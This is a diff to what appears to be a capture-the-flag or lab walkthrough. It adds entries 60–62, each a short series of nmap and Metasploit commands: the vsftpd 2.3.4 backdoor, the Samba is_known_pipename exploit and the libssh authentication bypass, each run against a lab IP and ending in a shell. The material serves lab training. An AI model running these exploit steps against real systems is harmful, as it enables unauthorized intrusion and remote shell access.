@@ -1146,13 +1146,36 @@ cd /
 dir
 type flag.txt
 ```
-60)
+60) Vulnerable FTP Server
 ```
+nmap -sS -sV 192.130.172.3
+nmap -p 21 --script vuln 192.130.172.3
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 192.130.172.3
+exploit
+/bin/bash -i
+```
+61) Vulnerable File Sharing Service
+```
+nmap -sS -sV 192.218.210.3
+use exploit/linux/samba/is_known_pipename
+set RHOST 192.218.210.3
+check
+exploit
+/bin/bash -i
 
 ```
-
-
-
+62) Vulnerable SSH server
+```
+nmap -sS -sV 192.51.205.3
+use auxiliary/scanner/ssh/libssh_auth_bypass
+set RHOSTS 192.51.205.3
+set SPAWN_PTY true
+exploit
+sessions -i 1
+id
+```
+63)
 
 
 
